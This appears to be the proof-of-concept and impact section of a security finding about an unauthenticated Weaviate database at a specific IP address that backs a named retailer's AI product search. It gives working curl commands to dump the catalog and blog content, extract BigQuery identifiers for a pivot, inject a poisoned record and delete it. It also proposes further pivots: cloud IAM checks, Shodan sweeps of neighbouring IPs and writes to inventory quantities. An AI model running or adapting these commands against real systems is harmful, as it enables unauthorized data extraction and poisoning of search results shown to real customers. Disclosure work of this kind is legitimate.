## PoC

### Read -- Full product catalog extraction

```bash
# Enumerate all products
curl -s "http://35.224.252.183:8080/v1/objects?class=Product&limit=100" \
  | jq '.objects[] | {sku: .properties.sku, name: .properties.name, brand: .properties.brand, bq_id: .properties.bq_id, qty: .properties.qty}'

# Extract blog content
curl -s "http://35.224.252.183:8080/v1/objects?class=BlogPost&limit=100" \
  | jq '.objects[] | {headline: .properties.headline, brand: .properties.brand, url: .properties.url}'
```

### Read -- BigQuery ID extraction (pivot target)

```bash
# bq_id may contain GCP project identifier -- extract for BigQuery pivot attempt
curl -s "http://35.224.252.183:8080/v1/objects?class=Product&limit=10" \
  | jq '.objects[].properties.bq_id'
```

### Write -- Product data poisoning

```bash
# Inject false product record into AI search index
curl -s -X POST http://35.224.252.183:8080/v1/objects \
  -H "Content-Type: application/json" \
  -d '{
    "class": "Product",
    "properties": {
      "product_id": "canary--20260620",
      "name": "canary--20260620",
      "sku": "CANARY-001",
      "brand": "canary",
      "price": 0,
      "qty": 0,
      "description": " security canary"
    }
  }' | jq '.id'
```

### Delete -- Canary removal

```bash
# Replace UUID with returned id from write above
curl -s -X DELETE \
  http://35.224.252.183:8080/v1/objects/Product/<canary-uuid>
# HTTP 204
```

## Impact

### Full Retail Catalog Exposure

~700 product records accessible with SKU, brand, inventory quantity, pricing, descriptions, and direct bearesonline.co.za product URLs. Competitors can extract the full product catalog including any pricing and inventory state not stripped at ingestion.

### BigQuery Pivot

Each Product and BlogPost record carries a bq_id field linking to a GCP BigQuery data warehouse. If the bq_id encodes the GCP project identifier, and if the BigQuery dataset has misconfigured IAM (allUsers or allAuthenticatedUsers read), the Weaviate exposure becomes a pivot to the full data warehouse backing the retail operation. Check: extract bq_id values, attempt `bq ls --project_id=<extracted>` or GCP Data Catalog lookup.

### AI Search / Recommendation Poisoning

Write access allows injecting arbitrary product records into the Weaviate index. The AI-powered search and recommendation system serving bearesonline.co.za customers would surface poisoned records -- false pricing, fabricated product specs, fake FAQ content -- directly to retail shoppers. No authentication required.

### SEO and Content Strategy Exposure

~200 blog post records with full article body, headline, brand, and metadata. This is the operator's complete content strategy, topic coverage, and SEO playbook -- extractable in full by any competitor.

## Pivot Avenues

1. **bearesonline.co.za** -- main retail site; identify the product search / recommendation UI that queries this Weaviate backend; test for indirect object references or additional unauth API surface
2. **bq_id field** -- extract values from Product and BlogPost records; attempt BigQuery IAM check against the derived GCP project ID; if public, this pivots to the full data warehouse
3. **GCP neighborhood** -- 35.224.0.0/14 is GCP us-central1; Shodan/Censys sweep for co-located South African retail services on adjacent IPs
4. **qty=0 in sampled records** -- determine if inventory management is a separate service also exposed; if inventory is live-synced, a write to qty field affects stock visibility for retail customers
